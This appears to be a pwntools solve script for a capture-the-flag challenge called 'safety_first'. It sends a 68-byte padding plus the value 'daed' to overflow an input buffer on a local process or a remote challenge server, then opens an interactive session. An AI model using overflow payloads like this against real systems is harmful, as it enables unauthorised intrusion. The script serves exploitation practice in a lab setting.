#!/usr/bin/python3

from pwn import *

exe = ELF('safety_first', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('130.85.56.42', 4000)
else:
    p = process(exe.path)

GDB()

p.recvuntil(b"input: ")
sl(b"a"* 68 + b"daed")


p.interactive()
